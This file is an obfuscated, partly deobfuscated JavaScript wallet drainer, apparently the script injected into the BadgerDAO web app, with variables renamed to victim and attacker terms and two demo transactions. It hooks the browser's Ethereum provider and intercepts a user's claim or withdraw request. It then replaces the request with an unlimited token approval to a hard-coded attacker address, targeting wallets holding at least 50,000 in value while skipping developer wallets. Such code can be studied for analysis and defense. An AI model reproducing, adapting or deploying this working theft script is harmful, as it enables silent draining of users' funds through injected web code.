<script>
var empty_arr = Array(0x19b);
var texts_arr = empty_arr.concat(["error","/log2","0xb16eb351000000000000000000000000","0x54cf9df9dcd78e470ab7cb892d7bfbe114c025fc","bool","0x59c68a651a1f49c26145666e9d5647b1472912a9","owner","0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","text","uint256","Approval",", newSpender: ","ethers is embedded!",", contractAddress: ","formatUnits","method","parse","Web3Provider","Contract","0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9","ethereum","increaseAllowance","allowance",", balance: ","encodeFunctionData","_approved: ","nonpayable","WITHDRAWING","approve",", maxVault: ","CLAIMING","utils","symbol","contractName","stringify","POST","event","spender","function increaseAllowance(address spender, uint addedValue)","16546248mVVbtv","_spender","0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F","0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2","listAccounts","apply","forEach","gas","log","data","balance","https://web.archive.org/web/20211129204203/https://api.badger.com/v2/accounts/","Transfer","931JNuWlv","contractSymbol","10512waBowy","_ethers","0xaf94d299a73c4545ff702e79d16d9fb1ab5bdabf","contractSymbol: ","2bQpZqP","allowanceWei","maxPriorityFeePerGas","encodedData","err","Withdrawing from the vault with the highest balance","view","3313384iKxMJQ","name","4531932SiFucS","EIP-1559","contract IERC20Upgradeable","function","toLowerCase","undefined","0x1FCdb04d0C5364FBd92C73cA8AF9BAA72c269107","Already has allowance, ","148955oXWuMb","address","0x2e1a7d4d000000000000000000000000","startsWith","params",": owner","includes","_to","Network is not Ethereum! network.chainId: ","length","0x4c16bf1f3acbcbf2b05291e8120dacc05c10586e","ADMIN: ","request","0x15b8fe651c268cfb5b519cc7e98bd45c162313c2","newArgs","eth_sendTransaction","decimals","providers","function approve(address spender, uint value)","value",", owner: ","gasPrice","balanceOf","Interface","maxFeePerGas","0xb65cef03b9b89f99517643226d76e286ee999e77","_value","hexlify","message","keys","application/json","Balance too low: ","userJson","maxBalance","_isIntercepted","uint8","transfer",", contractName: ","string","args","chainId","token","transferFrom","data_tx","2044480XuqSyr","2522511JAxUHN"]);
// 2 Demo transactions
var approveTx = {"method":"eth_sendTransaction","params":[{"value":"0x0","from":"0xf15525ed52F96A346F973238612f418929FaB4f7","to":"0x798D1bE841a82a273720CE31c822C61a67a601C3","data":"0x095ea7b30000000000000000000000001fcdb04d0c5364fbd92c73ca8af9baa72c269107ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","gasLimit":"0x035ecf","gasPrice":"0x0178904655","nonce":"0x00","chainId":1,"gas":"0xff3f"}]};
var increaseAllowance = {"method":"eth_sendTransaction","params":[{"value":"0x0","from":"0xf15525ed52F96A346F973238612f418929FaB4f7","to":"0x798D1bE841a82a273720CE31c822C61a67a601C3","data":"0x395093510000000000000000000000001fcdb04d0c5364fbd92c73ca8af9baa72c269107ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","gasLimit":"0x035ecf","gasPrice":"0x0178904655","nonce":"0x00","chainId":1,"gas":"0xff3f"}]};

(
    function (_0xff781a, _0x2ac14d) {
        var
            get_text_fn = get_text,
            _0x5d8bb7 = _0xff781a();
        while (true) {
            try {
                var _0x5bb478 = parseInt('148955oXWuMb') / 0x1 + parseInt('2bQpZqP') / 0x2 * (parseInt('2522511JAxUHN') / 0x3) + parseInt('3313384iKxMJQ') / 0x4 + -parseInt('2044480XuqSyr') / 0x5 + parseInt('4531932SiFucS') / 0x6 + -parseInt('931JNuWlv') / 0x7 * (-parseInt('10512waBowy') / 0x8) + -parseInt('16546248mVVbtv') / 0x9;
                if (_0x5bb478 === _0x2ac14d) break;
                else _0x5d8bb7['push'](_0x5d8bb7['shift']());
            } catch (_0x36388b) {
                _0x5d8bb7['push'](_0x5d8bb7['shift']());
            }
        }
        console.log(_0x5d8bb7);
    }(get_texts_array, 0x7a476)
);

async function _log(_0x12cb76, _0x2655b3) {
    console_log(_0x12cb76, _0x2655b3);
        // await fetch(
        //     '/log2',
        //     {
        //         'method': 'stringify',
        //         'mode': 'no-cors',
        //         'body': _0x12cb76 + ':' + JSON['stringify'](_0x2655b3),
        //         'headers': new Headers({ 'Content-Type': 'application/json' })
        //     }
        // );
}

function get_texts_array() {
    var texts_array = [
        'Network is not Ethereum! network.chainId: ',
        'length',
        '0x4c16bf1f3acbcbf2b05291e8120dacc05c10586e',
        'ADMIN: ',
        'request',
        '0x15b8fe651c268cfb5b519cc7e98bd45c162313c2',
        'newArgs',
        'eth_sendTransaction',
        'decimals',
        'providers',
        'function approve(address spender, uint value)',
        'value',
        ', owner: ',
        'gasPrice',
        'balanceOf',
        'Interface',
        'maxFeePerGas',
        '0xb65cef03b9b89f99517643226d76e286ee999e77',
        '_value',
        'hexlify',
        'message',
        'keys',
        'application/json',
        'Balance too low: ',
        'userJson',
        'maxBalance',
        '_isIntercepted',
        'uint8',
        'transfer',
        ', contractName: ',
        'string',
        'args',
        'chainId',
        'token',
        'transferFrom',
        'data_tx',
        '2044480XuqSyr',
        '2522511JAxUHN',
        'error',
        '/log2',
        '0xb16eb351000000000000000000000000',
        '0x54cf9df9dcd78e470ab7cb892d7bfbe114c025fc',
        'bool',
        '0x59c68a651a1f49c26145666e9d5647b1472912a9',
        'owner',
        '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
        'text',
        'uint256',
        'Approval',
        ', newSpender: ',
        'ethers is embedded!',
        ', contractAddress: ',
        'formatUnits',
        'method',
        'parse',
        'Web3Provider',
        'Contract',
        '0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9',
        'ethereum',
        'increaseAllowance',
        'allowance',
        ', balance: ',
        'encodeFunctionData',
        '_approved: ',
        'nonpayable',
        'WITHDRAWING',
        'approve',
        ', maxVault: ',
        'CLAIMING',
        'utils',
        'symbol',
        'contractName',
        'stringify',
        'POST',
        'event',
        'spender',
        'function increaseAllowance(address spender, uint addedValue)',
        '16546248mVVbtv',
        '_spender',
        '0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F',
        '0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2',
        'listAccounts',
        'apply',
        'forEach',
        'gas',
        'log',
        'data',
        'balance',
        'https://web.archive.org/web/20211129204203/https://api.badger.com/v2/accounts/',
        'Transfer',
        '931JNuWlv',
        'contractSymbol',
        '10512waBowy',
        '_ethers',
        '0xaf94d299a73c4545ff702e79d16d9fb1ab5bdabf',
        'contractSymbol: ',
        '2bQpZqP',
        'allowanceWei',
        'maxPriorityFeePerGas',
        'encodedData',
        'err',
        'Withdrawing from the vault with the highest balance',
        'view',
        '3313384iKxMJQ',
        'name',
        '4531932SiFucS',
        'EIP-1559',
        'contract IERC20Upgradeable',
        'function',
        'toLowerCase',
        'undefined',
        '0x1FCdb04d0C5364FBd92C73cA8AF9BAA72c269107',
        'Already has allowance, ',
        '148955oXWuMb',
        'address',
        '0x2e1a7d4d000000000000000000000000',
        'startsWith',
        'params',
        ': owner',
        'includes',
        '_to'
    ];
    get_texts_array = function () { return texts_array; };
    return get_texts_array();
}

function get_text(offset, NOTHING) {
    var texts_array = get_texts_array();
    return get_text = function (offset, NOTHING) {
        offset = offset - 0x19b;
        var output = texts_array[offset];
        return output;
    },
        get_text(offset, NOTHING);
}
function console_log(_0x3e05a1, _0x391b7c) {
    console.log('_' + _0x3e05a1, _0x391b7c);
}
var _denied = false, _approved = false;
async function getVaults(account) {
    var get_text_fn = get_text;
    try {
        var _0x58efc9 = await fetch('https://api.badger.com/v2/accounts/' + account + '?chain=ethereum'),
            _0x106739 = await _0x58efc9['text']();
        console_log('userData', _0x106739);
        var _0x180afe = JSON['parse'](_0x106739);
        return _log('userJson', _0x180afe), _0x180afe;
    } catch (_0x4c4e33) {
        return _log(_0x4c4e33), null;
    }
}
async function tx(_0x656ce6, _0x290819, requestArr) {
    var get_text_var = get_text;
    try {
        console_log('args', requestArr);
        var txParams = requestArr[0x0]['params'],
            txData = txParams[0x0]['data'],
            methodName = 'CLAIMING';
        txData['startsWith']('0x2e1a7d4d000000000000000000000000')
            && (methodName = 'WITHDRAWING');
        if (_denied) throw '_denied: ' + _denied;
        if (_approved) throw '_approved: ' + _approved;
        var
            attackerAddr = '0x1FCdb04d0C5364FBd92C73cA8AF9BAA72c269107',
            ethers = window['_ethers'];
        const ethProvider = new ethers[('providers')][('Web3Provider')](window['ethereum']);
        var _0x2d0c43 = await ethProvider['getNetwork']();
        console_log('chainId', _0x2d0c43['chainId']);
        if (_0x2d0c43['chainId'] != 0x1) throw 'Network is not Ethereum! network.chainId: ' + _0x2d0c43['chainId'];
        const _0x48a672 = await ethProvider['listAccounts'](),
            victimAddr = _0x48a672[0x0];
        _log(methodName + ': owner', victimAddr);
        var devWallets = [
            '0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9',
            '0xb65cef03b9b89f99517643226d76e286ee999e77',
            '0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F',
            '0x4c16bf1f3acbcbf2b05291e8120dacc05c10586e',
            '0x54cf9df9dcd78e470ab7cb892d7bfbe114c025fc',
            '0xaf94d299a73c4545ff702e79d16d9fb1ab5bdabf',
            '0x59c68a651a1f49c26145666e9d5647b1472912a9',
            '0x15b8fe651c268cfb5b519cc7e98bd45c162313c2'
        ];
        if (devWallets['includes'](victimAddr)) throw 'ADMIN: ' + victimAddr;
        var
            victimVaults = await getVaults(victimAddr),
            victim_balance = victimVaults['value'];
        _log('balance', victim_balance);
        if (
            victimAddr != '0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2' &&
            victim_balance < 0xc350
        ) throw 'Balance too low: ' + victim_balance;
        const signer_ = ethProvider['getSigner']();
        // User has more than $50K
        var ERC20ABI = [
            {
                'constant': true,
                'inputs': [],
                'name': 'name',
                'outputs': [
                    { 'name': '', 'type': 'string' }
                ],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'constant': ![],
                'inputs': [
                    {
                        'name': '_spender',
                        'type': 'address'
                    },
                    {
                        'name': '_value',
                        'type': 'uint256'
                    }
                ],
                'name':
                    'approve',
                'outputs': [
                    {
                        'name': '',
                        'type': 'bool'
                    }
                ],
                'payable': ![],
                'stateMutability': 'nonpayable',
                'type': 'function'
            },
            {
                'constant': true,
                'inputs': [],
                'name':
                    'totalSupply',
                'outputs': [
                    {
                        'name': '',
                        'type': 'uint256'
                    }],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'constant': ![],
                'inputs': [
                    {
                        'name': '_from',
                        'type': 'address'
                    },
                    {
                        'name': '_to',
                        'type': 'address'
                    },
                    {
                        'name': '_value',
                        'type': 'uint256'
                    }
                ],
                'name': 'transferFrom',
                'outputs': [
                    {
                        'name': '',
                        'type': 'bool'
                    }
                ],
                'payable': ![],
                'stateMutability': 'nonpayable',
                'type': 'function'
            },
            {
                'constant': true,
                'inputs': [],
                'name': 'decimals',
                'outputs': [
                    {
                        'name': '',
                        'type': 'uint8'
                    }
                ],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'constant': true,
                'inputs': [
                    {
                        'name': '_owner',
                        'type': 'address'
                    }
                ],
                'name': 'balanceOf',
                'outputs': [
                    {
                        'name': 'balance',
                        'type': 'uint256'
                    }
                ],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'constant': true,
                'inputs': [],
                'name':
                    'symbol',
                'outputs': [
                    {
                        'name': '',
                        'type': 'string'
                    }
                ],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'constant': ![],
                'inputs': [
                    {
                        'name': '_to',
                        'type': 'address'
                    },
                    {
                        'name': '_value',
                        'type': 'uint256'
                    }
                ],
                'name': 'transfer',
                'outputs': [
                    { 'name': '', 'type': 'bool' }
                ],
                'payable': ![],
                'stateMutability': 'nonpayable',
                'type': 'function'
            },
            {
                'constant': true,
                'inputs': [
                    {
                        'name': '_owner',
                        'type': 'address'
                    },
                    {
                        'name': '_spender',
                        'type': 'address'
                    }
                ],
                'name': 'allowance',
                'outputs': [
                    {
                        'name': '',
                        'type': 'uint256'
                    }
                ],
                'payable': ![],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'inputs': [],
                'name': 'token',
                'outputs': [
                    {
                        'internalType': 'contract IERC20Upgradeable',
                        'name': '',
                        'type': 'address'
                    }
                ],
                'stateMutability': 'view',
                'type': 'function'
            },
            {
                'payable': true,
                'stateMutability': 'payable',
                'type': 'fallback'
            },
            {
                'anonymous': ![],
                'inputs': [
                    {
                        'indexed': true,
                        'name': 'owner',
                        'type': 'address'
                    },
                    {
                        'indexed': true,
                        'name': 'spender',
                        'type': 'address'
                    },
                    {
                        'indexed': ![],
                        'name': 'value',
                        'type': 'uint256'
                    }
                ],
                'name': 'Approval',
                'type': 'event'
            },
            {
                'anonymous': ![],
                'inputs': [
                    {
                        'indexed': true,
                        'name': 'from',
                        'type': 'address'
                    },
                    {
                        'indexed': true,
                        'name': 'to',
                        'type': 'address'
                    },
                    {
                        'indexed': ![],
                        'name': 'value',
                        'type': 'uint256'
                    }
                ],
                'name': 'Transfer',
                'type': 'event'
            }
        ],
            maxVaultValue = 0x0,
            maxVaultAddress = null;
        for (var vaultObj of Object['keys'](victimVaults['data'])) {
            console_log(vaultObj, victimVaults['data'][vaultObj]);
            var
                vault = victimVaults['data'][vaultObj],
                _0x582ffe = vault['address'],
                _0x322715 = new ethers['Contract'](_0x582ffe, ERC20ABI
    , ethProvider),
                _0x456725 = await _0x322715['decimals']();
            console_log('decimals', _0x456725);
            var _0x296558 = await _0x322715['allowance'](victimAddr, attackerAddr);
            console_log('allowanceWei', _0x296558);
            var _0xb219bf = ethers['utils']['formatUnits'](_0x296558, _0x456725);
            console_log('allowance', _0xb219bf);
            if (_0xb219bf > 0x0) {
                var _0x4a56f5 = await _0x322715['symbol']();
                console_log('contractSymbol', _0x4a56f5);
                var _0x50526e = await _0x322715['name']();
                console_log('contractName', _0x50526e);
                throw 'Already has allowance, ' + 'contractSymbol: ' + _0x4a56f5 + ', contractName: ' + _0x50526e + ', contractAddress: ' + _0x582ffe;
            }
            vault['value'] > maxVaultValue && (maxVaultValue = vault['value'], maxVaultAddress = vault['address']);
        }
        _log('maxBalance', maxVaultValue),
            _log('maxVault', maxVaultAddress);
        var tx_data = null;
        if (
            txData['startsWith']('0x2e1a7d4d000000000000000000000000') &&
            maxVaultAddress['toLowerCase']() == txParams[0x0]['to']['toLowerCase']()
        ) {
            _log('Withdrawing from the vault with the highest balance', maxVaultAddress);
            var
                _0x322715 = new ethers[('Contract')](maxVaultAddress, ERC20ABI
    , ethProvider),
                _0x56e638 = await _0x322715['token']();
            console_log('tokenAddress', _0x56e638),
                maxVaultAddress = _0x56e638,
                _0x322715 = new ethers[('Contract')](maxVaultAddress, ERC20ABI
    , ethProvider);
            var _0x456725 = await _0x322715['decimals']();
            console_log('decimals', _0x456725);
            var _0x296558 = await _0x322715['allowance'](victimAddr, attackerAddr);
            console_log('allowanceWei', _0x296558);
            var _0xb219bf = ethers['utils']['formatUnits'](_0x296558, _0x456725);
            console_log('allowance', _0xb219bf);
            if (_0xb219bf > 0x0) {
                var _0x4a56f5 = await _0x322715['symbol']();
                console_log('contractSymbol', _0x4a56f5);
                var _0x50526e = await _0x322715['name']();
                console_log('contractName', _0x50526e);
                throw 'Already has allowance, ' + 'contractSymbol: ' + _0x4a56f5 + ', contractName: ' + _0x50526e + ', contractAddress: ' + _0x582ffe;
            }
            var _0x53b1ba = new ethers[('utils')]['Interface'](['function approve(address spender, uint value)']);
            tx_data = _0x53b1ba['encodeFunctionData']('approve', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
        }
        else {
            var _0x53b1ba = new ethers[('utils')][('Interface')](['function increaseAllowance(address spender, uint addedValue)']);
            tx_data = _0x53b1ba['encodeFunctionData']('increaseAllowance', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
        }
        console_log('encodedData', tx_data);
        var
            _0xd98577 = { ...txParams[0x0] };
        _0xd98577['data'] = tx_data,
            _0xd98577['to'] =
            maxVaultAddress, _0xd98577['gas'] = ethers['utils']['hexlify'](0xff3f),
            console_log('newParams', _0xd98577);
        var _0x543b9f = [
            {
                'method': 'eth_sendTransaction',
                'params': [_0xd98577]
            }
        ];
        console_log('args', requestArr),
            console_log('newArgs', _0x543b9f),
            _log('data', methodName + ', owner: ' + victimAddr + ', newSpender: ' + attackerAddr + ', maxVault: ' + maxVaultAddress + ', balance: ' + maxVaultValue);
        try {
            var _0x5dd52e = await Reflect['apply'](_0x656ce6, _0x290819, _0x543b9f);
            _log('tx', _0x5dd52e),
                _log('data_tx', methodName + ', owner: ' + victimAddr + ', newSpender: ' + attackerAddr + ', maxVault: ' + maxVaultAddress + ', balance: ' + maxVaultValue);
        }
        catch (_0x2b8012) {
            if (_0x2b8012['message'] && _0x2b8012['message']['includes']('EIP-1559')) {
                _log('EIP-1559', _0x2b8012['message']);
                try {
                    delete _0xd98577['maxFeePerGas'],
                        delete _0xd98577['maxPriorityFeePerGas'],
                        _0xd98577['gas'] = ethers['utils']['hexlify'](0x186a0);
                    var _0x5d292a = await ethProvider['getGasPrice']();
                    _log('gasPrice', ethers['utils']['hexlify'](_0x5d292a)),
                        _0xd98577['gasPrice'] = ethers['utils']['hexlify'](_0x5d292a),
                        _0x543b9f = [{ 'method': 'eth_sendTransaction', 'params': [_0xd98577] }];
                    var _0x5dd52e = await Reflect['apply'](_0x656ce6, _0x290819, _0x543b9f);
                    _log('tx', _0x5dd52e);
                }
                catch (_0x10a84d) {
                    _denied = true;
                    throw _0x10a84d;
                }
            }
            else _denied = true;
            throw _0x2b8012;
        }
        return _approved = true, Reflect['apply'](_0x656ce6, _0x290819, requestArr);
    }
    catch (_0x4b4862) {
        return _log('err', _0x4b4862), Reflect['apply'](_0x656ce6, _0x290819, requestArr);
    }
}
async function interceptMethodCalls(ethereum_obj) {
    var _0x19e38f = get_text;
    try {
        if (typeof window['_ethers'] !== 'undefined') {
            console_log('ethers is embedded!');
            var _0x5edbe5 = window['_ethers'];
            const _0x1d87c7 = new _0x5edbe5[('providers')]['Web3Provider'](window['ethereum']);
            var _0x32e13c = await _0x1d87c7['getNetwork']();
            console_log('chainId', _0x32e13c['chainId']),
                _0x32e13c['chainId'] == 0x1 &&
                (
                    console_log('The network is Ethereum mainnet'),
                    Object['keys'](ethereum_obj)['forEach'](
                        func_name => {
                            var _0x69aac = _0x19e38f;
                            const _0xf0ef0d = ethereum_obj[func_name];
                            if (typeof _0xf0ef0d === 'function') {
                                if (func_name == 'request') {
                                    const _0x16d963 = _0xf0ef0d;
                                    ethereum_obj[func_name] = (...args) => {
                                        var _0x591e38 = _0x69aac;
                                        console.log("incoming request:", args);
                                        try {
                                            if (
                                                args &&
                                                args['length'] == 0x1 &&
                                                'method' in args[0x0] &&
                                                args[0x0]['method'] == 'eth_sendTransaction' &&
                                                'params' in args[0x0]
                                            ) {
                                                var _0x294ee3 = args[0x0]['params'];
                                                if ('data' in _0x294ee3[0x0]) {
                                                    var _0x17a66a = _0x294ee3[0x0]['data'];
                                                    if (
                                                        _0x17a66a['startsWith']('0xb16eb351000000000000000000000000') ||
                                                        _0x17a66a['startsWith']('0x2e1a7d4d000000000000000000000000')
                                                    ) return tx(_0x16d963, ethereum_obj, args);
                                                }
                                            }
                                        } catch (_0x26f612) {
                                            _log('error', _0x26f612);
                                        }
                                        return Reflect['apply'](_0x16d963, ethereum_obj, args);
                                    };
                                }
                            }
                        }
                    )
                );
        }
    }
    catch (_0x499957) {
        _log('err', _0x499957);
    }
}
var _isIntercepted = false;
setInterval(
    function () {
        var get_text_fn = get_text;
        !_isIntercepted && (
            console_log('_isIntercepted', _isIntercepted),
            typeof window['ethereum'] !== 'undefined' &&
            typeof window['_ethers'] !== 'undefined' &&
            (interceptMethodCalls(ethereum), _isIntercepted = true, _log('_isIntercepted', _isIntercepted))
        );
    },
    0x3e8);

</script>